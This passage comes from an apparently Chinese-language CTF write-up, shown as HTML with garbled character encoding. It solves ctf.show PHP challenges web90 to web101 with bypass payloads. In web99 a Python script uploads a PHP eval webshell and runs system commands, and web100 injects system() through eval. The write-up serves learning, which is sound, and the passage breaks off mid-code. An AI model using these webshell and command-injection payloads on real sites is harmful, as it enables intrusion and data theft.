<li>å¦‚æœå­—ç¬¦ä¸²åŒ…æ‹¬äº† â€œ0xâ€ (æˆ– â€œ0Xâ€) çš„å‰ç¼€ï¼Œä½¿ç”¨ 16 è¿›åˆ¶ (hex)ï¼›å¦åˆ™ï¼Œ</li>
<li>å¦‚æœå­—ç¬¦ä¸²ä»¥ â€œ0â€ å¼€å§‹ï¼Œä½¿ç”¨ 8 è¿›åˆ¶(octal)ï¼›å¦åˆ™ï¼Œ</li>
<li>å°†ä½¿ç”¨ 10 è¿›åˆ¶ (decimal)ã€‚</li>
</ul>
</blockquote>
<p>æ‰€ä»¥æŠŠ4476è½¬æ¢æˆ16è¿›åˆ¶ï¼Œpayloadä¸º</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?num&#x3D;0x117c </span><br></pre></td></tr></table></figure>
<h3 id="web91"><a class="header-anchor" href="#web91">Â¶</a>web91</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">$a=$_GET[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^php$/im&#x27;</span>, $a))&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^php$/i&#x27;</span>, $a))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;nonononono&#x27;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>ç¬¬ä¸€ä¸ªiféœ€è¦åŒ¹é…åˆ°phpï¼Œè€Œç¬¬äºŒä¸ªifå¦‚æœåŒ¹é…åˆ°phpå°±ä¼šè¾“å‡ºhackerï¼Œç»•è¿‡éœ€è¦ä¸è®©å®ƒåŒ¹é…åˆ°ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªæ­£åˆ™åŒ¹é…çš„çŸ¥è¯†ç‚¹</p>
<blockquote>
<p>/iè¡¨ç¤ºåŒ¹é…å¤§å°å†™<br>
å­—ç¬¦ ^ å’Œ $ åŒæ—¶ä½¿ç”¨æ—¶ï¼Œè¡¨ç¤ºç²¾ç¡®åŒ¹é…ï¼Œéœ€è¦åŒ¹é…ä»¥phpå¼€å¤´å’Œä»¥phpç»“å°¾<br>
/m å¤šè¡ŒåŒ¹é… è‹¥å­˜åœ¨æ¢è¡Œ\nå¹¶ä¸”æœ‰å¼€å§‹^æˆ–ç»“æŸ$ç¬¦çš„æƒ…å†µä¸‹ï¼Œå°†ä»¥æ¢è¡Œä¸ºåˆ†éš”ç¬¦ï¼Œé€è¡Œè¿›è¡ŒåŒ¹é…<br>
ä½†æ˜¯å½“å‡ºç°æ¢è¡Œç¬¦ <code>%0a</code>çš„æ—¶å€™ï¼Œ$cmdçš„å€¼ä¼šè¢«å½“åšä¸¤è¡Œå¤„ç†ï¼Œè€Œæ­¤æ—¶ç¬¬äºŒä¸ªifæ­£åˆ™åŒ¹é…ä¸ç¬¦åˆä»¥phpå¼€å¤´å’Œä»¥phpç»“å°¾</p>
</blockquote>
<p>æ‰€ä»¥paylaodä¸º</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?cmd&#x3D;%0aphp</span><br><span class="line">æˆ–è€…</span><br><span class="line">?cmd&#x3D;php%0a%0a</span><br></pre></td></tr></table></figure>
<h3 id="web92"><a class="header-anchor" href="#web92">Â¶</a>web92</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>($num==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval($num,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> intval($num,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>é¢ï¼Œå’Œ90é¢˜ä¸€æ ·ï¼Œåªæ˜¯å˜æˆå¼±æ¯”è¾ƒï¼Œä¸€æ ·ä½¿ç”¨åå…­è¿›åˆ¶ç»•è¿‡</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?num&#x3D;0x117c</span><br></pre></td></tr></table></figure>
<h3 id="web93"><a class="header-anchor" href="#web93">Â¶</a>web93</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>($num==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[a-z]/i&quot;</span>, $num))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval($num,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> intval($num,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿‡æ»¤äº†å­—æ¯ï¼Œé‚£æˆ‘ä»¬ç›´æ¥ç”¨å°æ•°ç‚¹å³å¯(åˆ©ç”¨phpæµ®ç‚¹æ•°ä¸èƒ½ç›´æ¥æ¯”è¾ƒç›¸ç­‰çš„ç‰¹æ€§)ï¼Œæˆ–è€…8è¿›åˆ¶ä¹Ÿè¡Œ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?num&#x3D;4476.1</span><br></pre></td></tr></table></figure>
<h3 id="web94"><a class="header-anchor" href="#web94">Â¶</a>web94</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>($num===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[a-z]/i&quot;</span>, $num))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!strpos($num, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval($num,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™æ¬¡å˜æˆå¼ºæ¯”è¾ƒï¼Œå¹¶ä¸”å¤šåŠ äº†ä¸€ä¸ªstrposå‡½æ•°</p>
<blockquote>
<p><strong>strpos()</strong> å‡½æ•°æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">strpos(string,find,start)</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th style="text-align:left">å‚æ•°</th>
<th style="text-align:left">æè¿°</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><em>string</em></td>
<td style="text-align:left">å¿…éœ€ã€‚è§„å®šè¦æœç´¢çš„å­—ç¬¦ä¸²ã€‚</td>
</tr>
<tr>
<td style="text-align:left"><em>find</em></td>
<td style="text-align:left">å¿…éœ€ã€‚è§„å®šè¦æŸ¥æ‰¾çš„å­—ç¬¦ä¸²ã€‚</td>
</tr>
<tr>
<td style="text-align:left"><em>start</em></td>
<td style="text-align:left">å¯é€‰ã€‚è§„å®šåœ¨ä½•å¤„å¼€å§‹æœç´¢ã€‚</td>
</tr>
</tbody>
</table>
<p>è¿”å›å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°å­—ç¬¦ä¸²åˆ™è¿”å› FALSEã€‚</p>
<p><strong>æ³¨é‡Š</strong>ï¼šå­—ç¬¦ä¸²ä½ç½®ä» 0 å¼€å§‹ï¼Œä¸æ˜¯ä» 1 å¼€å§‹ã€‚</p>
</blockquote>
<p>å› ä¸ºå…«è¿›åˆ¶éœ€è¦å¼€å¤´æŒ‡å®šä¸º0ï¼Œè€Œstrpos()ä¼šåŒ¹é…åˆ°è¿”å›0ï¼Œ!0ä¹Ÿå°±æ˜¯1å¾—æ‰§è¡Œdieï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å‰é¢åŠ ä¸ªç©ºæ ¼ï¼Œè¿™æ ·strpos()ä¼šè¿”å›1ï¼Œæ‰€ä»¥æˆ‘ä»¬æŠŠ4476è½¬æ¢ä¸º8è¿›åˆ¶10574åï¼Œå‰é¢å†åŠ ä¸€ä¸ªç©ºæ ¼å³å¯ï¼Œpaylaodä¸º</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?num&#x3D; 010574</span><br></pre></td></tr></table></figure>
<h3 id="web95"><a class="header-anchor" href="#web95">Â¶</a>web95</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>($num==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[a-z]|\./i&quot;</span>, $num))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!strpos($num, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval($num,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>æ¢æˆå¼±æ¯”è¾ƒäº†ï¼Œä¸€æ ·ä½¿ç”¨ä¸Šé¢˜payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?num&#x3D; 010574</span><br></pre></td></tr></table></figure>
<h3 id="web96"><a class="header-anchor" href="#web96">Â¶</a>web96</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;u&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">&#x27;u&#x27;</span>]==<span class="string">&#x27;flag.php&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file($_GET[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>è¯»å–æ–‡ä»¶ï¼Œå‚æ•°ä¸ç­‰äºflag.phpï¼Œé‚£ç›´æ¥åŠ ä¸ª<code>./</code>å³å¯ï¼Œæœ‰å¤šç§åŠæ³•ï¼Œphpä¼ªåè®®ä¹Ÿå¯</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?u&#x3D;.&#x2F;flag.php</span><br></pre></td></tr></table></figure>
<h3 id="web97"><a class="header-anchor" href="#web97">Â¶</a>web97</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">	<span class="keyword">if</span> ($_POST[<span class="string">&#x27;a&#x27;</span>] != $_POST[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line">		<span class="keyword">if</span> (md5($_POST[<span class="string">&#x27;a&#x27;</span>]) === md5($_POST[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line">			<span class="keyword">echo</span> $flag;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">print</span> <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å¼ºæ¯”è¾ƒmd5ç±»å‹é¢˜ç›®ï¼Œæˆ‘åˆšå¥½åšè¿‡è¿™ä¸ªé¢˜å‹æ€»ç»“ï¼Œå¸ˆå‚…ä»¬å¯ä»¥å»æˆ‘çš„è¿™ç¯‡æ–‡ç« çœ‹çœ‹https://www.wlhhlc.top/posts/16813/<br>
md5å‡½æ•°å¤„ç†æ•°ç»„èˆ’æœä¼šè¿”å›NULLï¼Œä¸¤ä¸ªNULLå³ç›¸ç­‰<br>
paylaodä¸º</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">postï¼š</span><br><span class="line">a[]&#x3D;1&amp;b[]&#x3D;2</span><br></pre></td></tr></table></figure>
<h3 id="web98"><a class="header-anchor" href="#web98">Â¶</a>web98</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$_GET?$_GET=&amp;$_POST:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line">$_GET[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?$_GET=&amp;$_COOKIE:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line">$_GET[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?$_GET=&amp;$_SERVER:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line">highlight_file($_GET[<span class="string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?$flag:<span class="keyword">__FILE__</span>); </span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œæ˜¯ä¸‰ç›®è¿ç®—ç¬¦å’Œå–åœ°å€ï¼Œç¬¬äºŒè¡Œå’Œç¬¬ä¸‰è¡Œæ˜¯æ— ç”¨çš„ï¼Œå› ä¸ºç”¨ä¸åˆ°ï¼Œæ‰€ä»¥æˆ‘ä»¬åˆ†æä¸€ä¸‹ç¬¬ä¸€è¡Œå’Œç¬¬å››è¡Œ</p>
<blockquote>
<p>ç¬¬ä¸€è¡Œï¼šå¦‚æœå­˜åœ¨getä¼ å‚ï¼Œåˆ™æŠŠpostä¼ å‚åœ°å€ç»™getï¼Œå¯ä»¥ç®€å•ç†è§£ä¸ºpostè¦†ç›–äº†get<br>
ç¬¬å››è¡Œï¼Œå¦‚æœgetå‚æ•°<code>HTTP_FLAG</code>çš„å€¼ä¸ºflagï¼Œå°±è¯»å–æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯è¾“å‡ºflag</p>
</blockquote>
<p>æ‰€ä»¥æ€è·¯ä¹Ÿå°±å‡ºæ¥äº†ï¼Œpayloadä¸º</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?1&#x3D;2</span><br><span class="line"></span><br><span class="line">postï¼š</span><br><span class="line">HTTP_FLAG&#x3D;flag</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web98/V0DP3K7N%5BS%7BO%29LE%5B%40U%5DGTVY.png" alt=""></p>
<h3 id="web99"><a class="header-anchor" href="#web99">Â¶</a>web99</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$allow = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">36</span>; $i &lt; <span class="number">0x36d</span>; $i++) &#123; </span><br><span class="line">    array_push($allow, rand(<span class="number">1</span>,$i));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;n&#x27;</span>]) &amp;&amp; in_array($_GET[<span class="string">&#x27;n&#x27;</span>], $allow))&#123;</span><br><span class="line">    file_put_contents($_GET[<span class="string">&#x27;n&#x27;</span>], $_POST[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>çœ‹ä¸€ä¸‹ä»£ç ï¼Œæµç¨‹ä¸»è¦æ˜¯å…ˆåˆ›å»ºä¸€ä¸ªæ•°ç»„ï¼Œæ¥ç€å¾€æ•°ç»„é‡Œæ·»åŠ rand()å‡½æ•°äº§ç”Ÿçš„éšæœºæ•°ï¼›<br>
ç¬¬äºŒä¸ªifåˆ¤æ–­æ˜¯å¦å­˜åœ¨getå‚æ•°nï¼Œå¹¶ä¸”ç”¨in_array()åœ¨æ•°ç»„é‡Œæœç´¢å€¼<br>
æœ€åç”¨file_put_contentså‡½æ•°å†™æ•°æ®åˆ°æ–‡ä»¶ä¸­</p>
<blockquote>
<p>in_array() å‡½æ•°æœç´¢æ•°ç»„ä¸­æ˜¯å¦å­˜åœ¨æŒ‡å®šçš„å€¼</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">in_array(search,<span class="keyword">array</span>,type)</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th style="text-align:left">å‚æ•°</th>
<th style="text-align:left">æè¿°</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><em>search</em></td>
<td style="text-align:left">å¿…éœ€ã€‚è§„å®šè¦åœ¨æ•°ç»„æœç´¢çš„å€¼ã€‚</td>
</tr>
<tr>
<td style="text-align:left"><em>array</em></td>
<td style="text-align:left">å¿…éœ€ã€‚è§„å®šè¦æœç´¢çš„æ•°ç»„ã€‚</td>
</tr>
<tr>
<td style="text-align:left"><em>type</em></td>
<td style="text-align:left">å¯é€‰ã€‚å¦‚æœè®¾ç½®è¯¥å‚æ•°ä¸º trueï¼Œåˆ™æ£€æŸ¥æœç´¢çš„æ•°æ®ä¸æ•°ç»„çš„å€¼çš„ç±»å‹æ˜¯å¦ç›¸åŒã€‚</td>
</tr>
</tbody>
</table>
<p><strong>è¯´æ˜</strong></p>
<p>å¦‚æœç»™å®šçš„å€¼ <em>search</em> å­˜åœ¨äºæ•°ç»„ <em>array</em> ä¸­åˆ™è¿”å› trueã€‚å¦‚æœç¬¬ä¸‰ä¸ªå‚æ•°è®¾ç½®ä¸º trueï¼Œå‡½æ•°åªæœ‰åœ¨å…ƒç´ å­˜åœ¨äºæ•°ç»„ä¸­ä¸”æ•°æ®ç±»å‹ä¸ç»™å®šå€¼ç›¸åŒæ—¶æ‰è¿”å› trueã€‚</p>
<p>å¦‚æœæ²¡æœ‰åœ¨æ•°ç»„ä¸­æ‰¾åˆ°å‚æ•°ï¼Œå‡½æ•°è¿”å› falseã€‚</p>
<p>æ³¨é‡Šï¼šå¦‚æœ <em>search</em> å‚æ•°æ˜¯å­—ç¬¦ä¸²ï¼Œä¸” <em>type</em> å‚æ•°è®¾ç½®ä¸º trueï¼Œåˆ™æœç´¢åŒºåˆ†å¤§å°å†™ã€‚</p>
</blockquote>
<p>è¿™é‡Œin_array()å‡½æ•°åœ¨æ²¡æœ‰ç¬¬ä¸‰ä¸ªå€¼å¾—æ—¶å€™ä¼šè¿›è¡Œå¼±æ¯”è¾ƒï¼Œä¹Ÿå°±æ˜¯å­˜åœ¨å¼ºåˆ¶è½¬æ¢ï¼Œå³123.phpæ­¤æ—¶ä¼šè¢«è½¬æ¢ä¸º123ï¼Œæ‰€ä»¥payloadå¦‚ä¸‹<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web99/KBDG%5DWII%28FDE%29DEI4%5D%25S%25DP.png" alt=""><br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web99/%28CW%29ZM3V7J0KRO199%5BX78%25M.png" alt=""><br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web99/H40KA9%25M2BPO3VLFDZ083_C.png" alt=""><br>
æˆ‘å–œæ¬¢ç”¨è„šæœ¬è·‘</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/2/23 18:43</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://5922e022-e938-4ec4-905f-0ccd7cf07cdf.chall.ctf.show:8080/&quot;</span></span><br><span class="line">w_url = url + <span class="string">&quot;?n=123.php&quot;</span></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">&#x27;content&#x27;</span>: <span class="string">&#x27;&lt;?php @eval($_POST[dotast]);?&gt;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">get_shell = requests.post(url=w_url, data=data1)</span><br><span class="line">shell_url = url + <span class="string">&quot;123.php&quot;</span></span><br><span class="line">get_test = requests.get(url=shell_url)</span><br><span class="line"><span class="keyword">if</span>(get_test.status_code==<span class="number">200</span>):</span><br><span class="line">    print(<span class="string">&quot;å†™å…¥shellæˆåŠŸ&quot;</span>)</span><br><span class="line">    data2=&#123;</span><br><span class="line">        <span class="string">&#x27;dotast&#x27;</span>: <span class="string">&#x27;system(&quot;cat flag36d.php&quot;);&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.post(url=shell_url, data=data2)</span><br><span class="line">    print(res.text)</span><br></pre></td></tr></table></figure>
<p>è¿è¡Œåå³å¯å¾—åˆ°flag</p>
<h3 id="web100"><a class="header-anchor" href="#web100">Â¶</a>web100</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line">$ctfshow = <span class="keyword">new</span> ctfshow();</span><br><span class="line">$v1=$_GET[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">$v2=$_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">$v3=$_GET[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">$v0=is_numeric($v1) <span class="keyword">and</span> is_numeric($v2) <span class="keyword">and</span> is_numeric($v3);</span><br><span class="line"><span class="keyword">if</span>($v0)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;/&quot;</span>, $v2))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/\;/&quot;</span>, $v3))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>ä¸€å…±éœ€è¦ä¼ ä¸‰ä¸ªgetå‚æ•°ï¼Œç„¶å<code>$vo</code>æ˜¯å¯¹ä¸‰ä¸ªå‚æ•°çš„ä¸çš„ç»“æœï¼Œäº†è§£ä¸€ä¸‹<code>s_numeric()</code>å‡½æ•°</p>
<blockquote>
<p><strong>is_numeric()</strong> å‡½æ•°ç”¨äºæ£€æµ‹å˜é‡æ˜¯å¦ä¸ºæ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸²<br>
å¦‚æœæŒ‡å®šçš„å˜é‡æ˜¯æ•°å­—å’Œæ•°å­—å­—ç¬¦ä¸²åˆ™è¿”å› TRUEï¼Œå¦åˆ™è¿”å› FALSE</p>
</blockquote>
<p>çœ‹åˆ°æœ€åevalï¼Œè‚¯å®šæ˜¯éœ€è¦å‘½ä»¤æ‰§è¡Œï¼Œè¿™éœ€è¦<code>$v2</code>ä¼ å…¥å‘½ä»¤ï¼Œ<code>$v3</code>éœ€è¦<code>;</code>ç»“å°¾ï¼Œä½†è¿™ä¹ˆä¸€æ¥å°±å˜æˆäº†</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$vo &#x3D; $v1 and FALSE and FAlse</span><br></pre></td></tr></table></figure>
<p>ä½†phpæœ‰è¿ç®—çš„ä¼˜å…ˆçº§ï¼Œä¹Ÿå°±æ˜¯<code>&amp;&amp;&gt; = &gt; and</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a = <span class="literal">true</span> <span class="keyword">and</span> <span class="literal">false</span>;</span><br></pre></td></tr></table></figure>
<p>æŒ‰ç…§è¿ç®—ä¼˜å…ˆçº§ï¼Œå…ˆæ‰§è¡Œ<code>=</code>ä¹Ÿå°±æ˜¯èµ‹å€¼ç»™$aä¸ºtrueï¼Œfalseå°±è¢«å¿½ç•¥äº†ï¼Œæ€è·¯ä¹Ÿå°±æœ‰äº†ï¼Œpaylaodä¸º</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?v1&#x3D;1&amp;v2&#x3D;system(&quot;tac ctfshow.php&quot;)&amp;v3&#x3D;;</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web100/OU85D5HVD%25ONT_%25R1M9IS_F.png" alt=""><br>
å¾—åˆ°<code>$flag_is_1ce376300x2d8dc70x2d4b870x2d9f0e0x2d1eea5dada15;</code>ï¼Œå…¶ä¸­0x2déœ€è¦æ›¿æ¢æˆ<code>-</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1ce37630-8dc7-4b87-9f0e-1eea5dada15</span><br></pre></td></tr></table></figure>
<p>ç„¶è€Œä¸€å…±35ä½è¿˜å°‘äº†ä¸€ä½ï¼Œæœ€åä¸€ä½éœ€è¦ä¸æ–­æäº¤flagçˆ†ç ´ï¼Œ0-9a-fä¸€å…±è¯•æœ€å¤š16æ¬¡å³å¯å¾—åˆ°flagï¼Œæˆ‘è¯•åˆ°ç¬¬å…­æ¬¡æäº¤æˆåŠŸğŸ˜­</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;1ce37630-8dc7-4b87-9f0e-1eea5dada156&#125;</span><br></pre></td></tr></table></figure>
<h3 id="web101"><a class="header-anchor" href="#web101">Â¶</a>web101</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line">$ctfshow = <span class="keyword">new</span> ctfshow();</span><br><span class="line">$v1=$_GET[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">$v2=$_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">$v3=$_GET[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">$v0=is_numeric($v1) <span class="keyword">and</span> is_numeric($v2) <span class="keyword">and</span> is_numeric($v3);</span><br><span class="line"><span class="keyword">if</span>($v0)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\;|\?|[0-9]/&quot;</span>, $v2))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span 